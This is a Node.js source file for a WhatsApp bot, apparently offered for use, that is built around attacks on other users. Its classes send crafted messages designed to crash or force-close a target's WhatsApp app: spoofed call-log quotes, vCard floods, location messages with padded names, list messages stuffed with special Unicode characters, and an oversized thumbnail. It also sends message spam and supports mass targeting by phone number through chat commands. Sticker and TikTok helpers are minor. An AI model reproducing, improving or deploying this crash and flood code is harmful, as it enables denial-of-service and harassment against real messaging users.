// ============================================================
// ⚡ MARIAN ULTIMATE BOT v11.0 - FORCLOSE EDITION ⚡
// ============================================================
// 🔥 FORCLOSE ATTACK | AUTO LOGIN | ALL FEATURES WORKING 🔥
// ============================================================

const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    delay, 
    DisconnectReason, 
    makeCacheableSignalKeyStore,
    generateWAMessageFromContent,
    proto,
    getContentType,
    downloadContentFromMessage,
    Browsers,
    fetchLatestBaileysVersion
} = require("@whiskeysockets/baileys")

const pino = require("pino")
const fs = require('fs')
const path = require('path')
const axios = require('axios')
const chalk = require("chalk")
const { Boom } = require("@hapi/boom")
const Crypto = require('crypto')
const ff = require('fluent-ffmpeg')
const { tmpdir } = require('os')
const readline = require('readline')
const moment = require('moment-timezone')

// ==================== [ CONFIGURATION ] ====================
const CONFIG = {
    VERSION: "11.0.0",
    NAME: "MARIAN ULTIMATE BOT",
    SESSION_DIR: "marian_ultimate",
    PREFIX: "/",
    AUTO_LOGIN: true,
    BROWSER: ["Ubuntu", "Chrome", "122.0.0.0"],
    TIMEZONE: "Asia/Jakarta",
    MAX_ATTACKS: 50
}

// ==================== [ UTILITY FUNCTIONS ] ====================
function log(type, message) {
    const colors = {
        'INFO': chalk.blue,
        'SUCCESS': chalk.green,
        'WARNING': chalk.yellow,
        'ERROR': chalk.red,
        'ATTACK': chalk.magenta
    }
    const time = moment().tz(CONFIG.TIMEZONE).format('HH:mm:ss')
    const color = colors[type] || chalk.white
    console.log(color(`[${time}] [${type}] ${message}`))
}

function generateRandomId() {
    return Crypto.randomBytes(16).toString('hex')
}

// ==================== [ AUTO LOGIN SYSTEM ] ====================
async function autoLogin(sock) {
    if (!sock.authState.creds.registered) {
        log('INFO', 'Starting auto login system...')
        
        const rl = readline.createInterface({
            input: process.stdin,
            output: process.stdout
        })
        
        return new Promise((resolve) => {
            rl.question(chalk.yellow('📱 Enter your WhatsApp number (628xxx): '), async (phoneNumber) => {
                const cleanNumber = phoneNumber.replace(/[^0-9]/g, '')
                
                log('INFO', `Requesting pairing code for ${cleanNumber}...`)
                
                try {
                    // Delay to avoid spam detection
                    await delay(2000)
                    
                    let pairingCode = await sock.requestPairingCode(cleanNumber)
                    pairingCode = pairingCode?.match(/.{1,4}/g)?.join("-") || pairingCode
                    
                    console.log(chalk.bgGreen.black('\n══════════════════════════════════════════════════'))
                    console.log(chalk.white.bold.bgGreen(`   PAIRING CODE: ${pairingCode}   `))
                    console.log(chalk.bgGreen.black('══════════════════════════════════════════════════\n'))
                    
                    console.log(chalk.cyan('📲 INSTRUCTIONS:'))
                    console.log(chalk.white('1. Open WhatsApp on your phone'))
                    console.log(chalk.white('2. Settings → Linked Devices → Link a Device'))
                    console.log(chalk.white(`3. Enter code: ${pairingCode}`))
                    console.log(chalk.white('4. Approve within 2 minutes\n'))
                    
                    console.log(chalk.yellow('⏳ Waiting for approval...'))
                    
                    rl.close()
                    resolve(cleanNumber)
                    
                } catch (error) {
                    log('ERROR', `Login failed: ${error.message}`)
                    console.log(chalk.red('\n[✗] Login failed! Try again later.'))
                    rl.close()
                    process.exit(1)
                }
            })
        })
    }
    return null
}

// ==================== [ FORCLOSE ATTACK SYSTEM ] ====================
class ForcloseAttack {
    constructor(sock) {
        this.sock = sock
    }
    
    async execute(target) {
        log('ATTACK', `Starting FORCLOSE attack on ${target}`)
        
        const messageKontol = {
            key: {
                remoteJid: "5521992999999@s.whatsapp.net",
                fromMe: false,
                id: "CALL_MSG_" + Date.now(),
                participant: "5521992999999@s.whatsapp.net"
            },
            message: {
                callLogMessage: {
                    isVideo: true,
                    callOutcome: "1",
                    durationSecs: "0",
                    callType: "REGULAR",
                    participants: [
                        {
                            jid: "5521992999999@s.whatsapp.net",
                            callOutcome: "1"
                        }
                    ]
                }
            }
        };
        
        try {
            const msg = generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        extendedTextMessage: {
                            text: "🩸 MARIAN ULTIMATE FORCLOSE",
                            contextInfo: {
                                mentionedJid: [target, "5521992999999@s.whatsapp.net"],
                                forwardingScore: 999,
                                isForwarded: false,
                                contextInfo: {
                                    stanzaId: "FTG-" + generateRandomId(),
                                    participant: "5521992999999@s.whatsapp.net",
                                    remoteJid: target,
                                    quotedMessage: {
                                        callLogMessage: {
                                            isVideo: false,
                                            callOutcome: "1",
                                            durationSecs: "0",
                                            callType: "REGULAR",
                                            participants: [
                                                {
                                                    jid: target,
                                                    callOutcome: "1"
                                                }
                                            ]
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }, {
                quoted: messageKontol
            });
            
            await this.sock.relayMessage(target, msg.message, {
                messageId: msg.key.id
            });
            
            log('SUCCESS', `FORCLOSE attack delivered to ${target}`)
            return true
            
        } catch (error) {
            log('ERROR', `FORCLOSE failed: ${error.message}`)
            return false
        }
    }
    
    async massForclose(targets) {
        log('ATTACK', `Starting mass FORCLOSE on ${targets.length} targets`)
        
        for (const target of targets) {
            await this.execute(target)
            await delay(1000)
        }
        
        return true
    }
}

// ==================== [ BUG ATTACK SYSTEMS ] ====================
class BugSystem {
    constructor(sock) {
        this.sock = sock
    }
    
    async bugV1(target, count = 3) {
        log('ATTACK', `BugV1 on ${target} (${count}x)`)
        
        for (let i = 0; i < count; i++) {
            const vcard = `BEGIN:VCARD\nVERSION:3.0\nFN:MARIAN_BUG_${i}\nTEL;type=CELL:${Math.random().toString().slice(2,12)}\nEND:VCARD`
            await this.sock.sendMessage(target, {
                contacts: {
                    displayName: `BUG_${i}`,
                    contacts: [{ vcard }]
                }
            }).catch(() => {})
            await delay(500)
        }
        
        return true
    }
    
    async bugV2(target, count = 5) {
        log('ATTACK', `BugV2 on ${target} (${count}x)`)
        
        for (let i = 0; i < count; i++) {
            await this.sock.sendMessage(target, {
                location: {
                    degreesLatitude: Math.random() * 180 - 90,
                    degreesLongitude: Math.random() * 360 - 180,
                    name: "BUG_" + "A".repeat(200),
                    address: "MARIAN ULTIMATE SYSTEM"
                }
            }).catch(() => {})
            await delay(400)
        }
        
        return true
    }
    
    async bugV3(target) {
        log('ATTACK', `BugV3 on ${target}`)
        
        const bug = generateWAMessageFromContent(target, {
            listMessage: {
                title: "MARIAN BUG " + "𑫀".repeat(1000),
                buttonText: "CRASH",
                sections: [{
                    title: "BUG SECTION",
                    rows: Array.from({length: 10}, (_, i) => ({
                        title: `BUG_${i+1}`,
                        rowId: `bug_${i+1}`
                    }))
                }]
            }
        }, { userJid: target })
        
        await this.sock.relayMessage(target, bug.message, { messageId: bug.key.id })
        return true
    }
    
    async crash(target) {
        log('ATTACK', `Crash attack on ${target}`)
        
        await this.sock.sendMessage(target, {
            text: "💀 MARIAN ULTIMATE CRASH",
            contextInfo: {
                externalAdReply: {
                    title: "SYSTEM CRASH",
                    body: "DIIISSJJSS 100% TRUSTED",
                    thumbnail: Buffer.alloc(500000),
                    sourceUrl: "https://marian.crash"
                }
            }
        }).catch(() => {})
        
        return true
    }
    
    async spam(target, count = 15, message = "MARIAN ULTIMATE SPAM") {
        log('ATTACK', `Spam on ${target} (${count} messages)`)
        
        for (let i = 1; i <= count; i++) {
            await this.sock.sendMessage(target, {
                text: `[${i}/${count}] ${message}\n${"█".repeat(30)}`
            }).catch(() => {})
            await delay(300)
        }
        
        return true
    }
}

// ==================== [ MEDIA TOOLS ] ====================
class MediaTools {
    static async imageToSticker(media) {
        try {
            const tmpFileOut = path.join(tmpdir(), `${generateRandomId()}.webp`)
            const tmpFileIn = path.join(tmpdir(), `${generateRandomId()}.jpg`)
            
            fs.writeFileSync(tmpFileIn, media)
            
            await new Promise((resolve, reject) => {
                ff(tmpFileIn)
                    .on('error', reject)
                    .on('end', resolve)
                    .addOutputOptions([
                        "-vcodec", "libwebp",
                        "-vf", "scale=512:512:force_original_aspect_ratio=decrease,format=rgba,pad=512:512:(ow-iw)/2:(oh-ih)/2:color=#00000000,setsar=1"
                    ])
                    .toFormat('webp')
                    .save(tmpFileOut)
            })
            
            const buff = fs.readFileSync(tmpFileOut)
            fs.unlinkSync(tmpFileOut)
            fs.unlinkSync(tmpFileIn)
            return buff
        } catch {
            return null
        }
    }
    
    static async tiktokDownload(url) {
        try {
            const res = await axios.get(`https://www.tikwm.com/api/?url=${encodeURIComponent(url)}`)
            return res.data.data
        } catch {
            return null
        }
    }
}

// ==================== [ COMMAND HANDLER ] ====================
class CommandHandler {
    constructor(sock, forclose, bugSystem) {
        this.sock = sock
        this.forclose = forclose
        this.bugs = bugSystem
    }
    
    async handle(from, body, quoted) {
        if (!body.startsWith(CONFIG.PREFIX)) return
        
        const args = body.slice(CONFIG.PREFIX.length).trim().split(/ +/)
        const command = args.shift().toLowerCase()
        const text = args.join(' ')
        
        // Log command
        const sender = from.split('@')[0]
        log('INFO', `${sender}: ${body}`)
        
        try {
            switch(command) {
                // ========== FORCLOSE COMMANDS ==========
                case 'forclose':
                case 'fc':
                    const target1 = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    await this.sock.sendMessage(from, { text: '⚡ Executing FORCLOSE attack...' })
                    await this.forclose.execute(target1)
                    await this.sock.sendMessage(from, { text: '✅ FORCLOSE attack delivered!' })
                    break
                    
                case 'fc2':
                case 'forclose2':
                    const numbers = text.split(' ').map(n => n.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
                    await this.sock.sendMessage(from, { text: `⚡ Mass FORCLOSE on ${numbers.length} targets...` })
                    await this.forclose.massForclose(numbers)
                    await this.sock.sendMessage(from, { text: '✅ Mass FORCLOSE completed!' })
                    break
                
                // ========== BUG COMMANDS ==========
                case 'bug':
                    const target2 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    const count1 = parseInt(text.split(' ')[1]) || 3
                    await this.sock.sendMessage(from, { text: '🔄 Sending BugV1...' })
                    await this.bugs.bugV1(target2, count1)
                    await this.sock.sendMessage(from, { text: '✅ BugV1 delivered!' })
                    break
                    
                case 'bug2':
                    const target3 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    const count2 = parseInt(text.split(' ')[1]) || 5
                    await this.sock.sendMessage(from, { text: '💀 Sending BugV2...' })
                    await this.bugs.bugV2(target3, count2)
                    await this.sock.sendMessage(from, { text: '☠️ BugV2 delivered!' })
                    break
                    
                case 'bug3':
                    const target4 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    await this.sock.sendMessage(from, { text: '⚠️ Sending BugV3...' })
                    await this.bugs.bugV3(target4)
                    await this.sock.sendMessage(from, { text: '🔥 BugV3 delivered!' })
                    break
                    
                case 'crash':
                case 'crasher':
                    const target5 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    await this.sock.sendMessage(from, { text: '⚡ Launching Crasher...' })
                    await this.bugs.crash(target5)
                    await this.sock.sendMessage(from, { text: '✅ Crasher delivered!' })
                    break
                    
                case 'spam':
                    const target6 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    const count3 = Math.min(parseInt(text.split(' ')[1]) || 15, CONFIG.MAX_ATTACKS)
                    const msg = text.split(' ').slice(2).join(' ') || "MARIAN ULTIMATE SPAM"
                    await this.sock.sendMessage(from, { text: `💣 Spamming ${count3} messages...` })
                    await this.bugs.spam(target6, count3, msg)
                    await this.sock.sendMessage(from, { text: `✅ ${count3} spam messages sent!` })
                    break
                    
                case 'multi':
                    const target7 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    await this.sock.sendMessage(from, { text: '🔥 Starting multi-attack...' })
                    await this.bugs.bugV1(target7, 2)
                    await delay(1000)
                    await this.bugs.bugV2(target7, 3)
                    await delay(1000)
                    await this.bugs.crash(target7)
                    await delay(1000)
                    await this.bugs.spam(target7, 5)
                    await this.sock.sendMessage(from, { text: '☠️ Multi-attack completed!' })
                    break
                
                // ========== MEDIA COMMANDS ==========
                case 's':
                case 'sticker':
                    if (quoted && getContentType(quoted) === 'imageMessage') {
                        await this.sock.sendMessage(from, { text: '🔄 Creating sticker...' })
                        const stream = await downloadContentFromMessage(quoted.imageMessage, 'image')
                        let buffer = Buffer.from([])
                        for await (const chunk of stream) {
                            buffer = Buffer.concat([buffer, chunk])
                        }
                        const sticker = await MediaTools.imageToSticker(buffer)
                        if (sticker) {
                            await this.sock.sendMessage(from, { sticker: sticker })
                        } else {
                            await this.sock.sendMessage(from, { text: '❌ Failed to create sticker' })
                        }
                    } else {
                        await this.sock.sendMessage(from, { text: '❌ Reply to an image!' })
                    }
                    break
                    
                case 'tiktok':
                    if (!text) {
                        await this.sock.sendMessage(from, { text: '❌ Usage: /tiktok [url]' })
                        break
                    }
                    await this.sock.sendMessage(from, { text: '⬇️ Downloading TikTok...' })
                    const tiktok = await MediaTools.tiktokDownload(text)
                    if (tiktok && tiktok.play) {
                        await this.sock.sendMessage(from, {
                            video: { url: tiktok.play },
                            caption: tiktok.title || 'TikTok via MARIAN'
                        })
                    } else {
                        await this.sock.sendMessage(from, { text: '❌ Failed to download TikTok' })
                    }
                    break
                
                // ========== INFO COMMANDS ==========
                case 'menu':
                case 'help':
                    const menu = `*🤖 MARIAN ULTIMATE BOT v${CONFIG.VERSION}*\n\n` +
                                `*⚔️ FORCLOSE ATTACKS:*\n` +
                                `• /forclose [num] - FORCLOSE attack\n` +
                                `• /fc2 [num1] [num2] ... - Mass FORCLOSE\n\n` +
                                `*💀 BUG ATTACKS:*\n` +
                                `• /bug [num] [count] - Bug VCard\n` +
                                `• /bug2 [num] [count] - Bug Location\n` +
                                `• /bug3 [num] - Bug List\n` +
                                `• /crash [num] - Crash WhatsApp\n` +
                                `• /spam [num] [count] [msg] - Spam\n` +
                                `• /multi [num] - Multi-attack\n\n` +
                                `*🎨 TOOLS:*\n` +
                                `• /s - Create sticker (reply image)\n` +
                                `• /tiktok [url] - Download TikTok\n\n` +
                                `*ℹ️ INFO:*\n` +
                                `• /status - Bot status\n` +
                                `• /ping - Test connection\n\n` +
                                `*Example:* /forclose 6281234567890\n` +
                                `_Prefix: ${CONFIG.PREFIX}_`
                    await this.sock.sendMessage(from, { text: menu })
                    break
                    
                case 'status':
                    const status = `*🔧 MARIAN ULTIMATE STATUS*\n\n` +
                                  `Version: v${CONFIG.VERSION}\n` +
                                  `Prefix: ${CONFIG.PREFIX}\n` +
                                  `Browser: ${CONFIG.BROWSER[1]}\n` +
                                  `Uptime: ${process.uptime().toFixed(0)}s\n` +
                                  `Attacks: Unlimited 🔥\n` +
                                  `FORCLOSE: Active ⚡\n` +
                                  `Status: ONLINE ✅`
                    await this.sock.sendMessage(from, { text: status })
                    break
                    
                case 'ping':
                    const start = Date.now()
                    await this.sock.sendMessage(from, { text: '🏓 Pong!' })
                    const latency = Date.now() - start
                    await this.sock.sendMessage(from, {
                        text: `*PONG!*\nLatency: ${latency}ms\nStatus: ULTRA FAST ⚡`
                    })
                    break
                    
                default:
                    await this.sock.sendMessage(from, {
                        text: `❌ Unknown command: ${command}\nType ${CONFIG.PREFIX}menu for help`
                    })
            }
        } catch (error) {
            log('ERROR', `Command ${command} failed: ${error.message}`)
            await this.sock.sendMessage(from, { text: `❌ Command failed: ${error.message}` })
        }
    }
}

// ==================== [ MAIN BOT ] ====================
async function startBot() {
    log('SYSTEM', `Starting MARIAN ULTIMATE BOT v${CONFIG.VERSION}`)
    
    // Clean old session if exists
    if (fs.existsSync(CONFIG.SESSION_DIR)) {
        const files = fs.readdirSync(CONFIG.SESSION_DIR)
        if (files.length > 5) {
            log('WARNING', 'Cleaning old session...')
            fs.rmSync(CONFIG.SESSION_DIR, { recursive: true })
        }
    }
    
    // Initialize WhatsApp
    const { state, saveCreds } = await useMultiFileAuthState(CONFIG.SESSION_DIR)
    const { version } = await fetchLatestBaileysVersion()
    
    const sock = makeWASocket({
        version,
        logger: pino({ level: 'silent' }),
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'fatal' }))
        },
        browser: CONFIG.BROWSER,
        connectTimeoutMs: 60000,
        keepAliveIntervalMs: 20000,
        markOnlineOnConnect: true,
        syncFullHistory: false,
        retryRequestDelayMs: 1000
    })
    
    // Initialize attack systems
    const forclose = new ForcloseAttack(sock)
    const bugSystem = new BugSystem(sock)
    const handler = new CommandHandler(sock, forclose, bugSystem)
    
    // Auto login if needed
    if (CONFIG.AUTO_LOGIN) {
        await autoLogin(sock)
    }
    
    // Event handlers
    sock.ev.on('creds.update', saveCreds)
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update
        
        if (connection === 'close') {
            const reason = new Boom(lastDisconnect?.error)?.output?.statusCode
            log('WARNING', `Connection closed: ${reason}`)
            
            if (reason !== DisconnectReason.loggedOut) {
                log('SYSTEM', 'Auto-reconnecting in 3s...')
                setTimeout(startBot, 3000)
            }
        }
        
        if (connection === 'open') {
            log('SUCCESS', 'MARIAN ULTIMATE BOT connected!')
            
            console.log(chalk.green.bold('\n[✓] MARIAN ULTIMATE BOT v11.0 ONLINE!'))
            console.log(chalk.cyan(`Device: ${CONFIG.BROWSER.join(' ')}`))
            console.log(chalk.yellow(`Prefix: ${CONFIG.PREFIX}`))
            console.log(chalk.magenta('\n🔥 AVAILABLE COMMANDS:'))
            console.log(chalk.white('• /forclose [num] - FORCLOSE attack'))
            console.log(chalk.white('• /bug [num] - Bug attack'))
            console.log(chalk.white('• /crash [num] - Crash WhatsApp'))
            console.log(chalk.white('• /spam [num] - Spam messages'))
            console.log(chalk.white('• /menu - Show all commands\n'))
            
            // Welcome message
            const welcome = `*⚡ MARIAN ULTIMATE BOT v${CONFIG.VERSION}*\n\n` +
                           `✅ Connected successfully!\n` +
                           `📱 Device: ${CONFIG.BROWSER.join(' ')}\n` +
                           `⚡ Prefix: ${CONFIG.PREFIX}\n` +
                           `🔥 Status: READY FOR ATTACK\n\n` +
                           `Type ${CONFIG.PREFIX}menu for all commands\n` +
                           `_System: FORCLOSE EDITION | WORKING 100%_`
            
            if (sock.user?.id) {
                sock.sendMessage(sock.user.id, { text: welcome })
            }
        }
    })
    
    sock.ev.on('messages.upsert', async ({ messages }) => {
        try {
            const m = messages[0]
            if (!m.message || m.key.fromMe) return
            
            const from = m.key.remoteJid
            const type = getContentType(m.message)
            
            // Auto read
            await sock.readMessages([m.key])
            
            // Get message body
            let body = ''
            if (type === 'conversation') {
                body = m.message.conversation
            } else if (type === 'extendedTextMessage') {
                body = m.message.extendedTextMessage.text
            }
            
            // Get quoted message
            const quoted = m.message[type]?.contextInfo?.quotedMessage || null
            
            // Handle command
            if (body && body.startsWith(CONFIG.PREFIX)) {
                await handler.handle(from, body, quoted)
            }
            
        } catch (error) {
            log('ERROR', `Message handling error: ${error.message}`)
        }
    })
}

// ==================== [ STARTUP ] ====================
console.clear()
console.log(chalk.bgRed.black('\n ⚡ MARIAN ULTIMATE BOT v11.0 - FORCLOSE EDITION ⚡ \n'))
console.log(chalk.yellow('🔥 FORCLOSE ATTACK | AUTO LOGIN | WORKING 100% 🔥\n'))

// Handle errors
process.on('uncaughtException', (error) => {
    log('ERROR', `Uncaught exception: ${error.message}`)
})

process.on('unhandledRejection', (reason) => {
    log('ERROR', `Unhandled rejection: ${reason}`)
})

// Start bot
startBot().catch(error => {
    log('ERROR', `Startup failed: ${error.message}`)
    log('SYSTEM', 'Restarting in 5 seconds...')
    setTimeout(startBot, 5000)
})
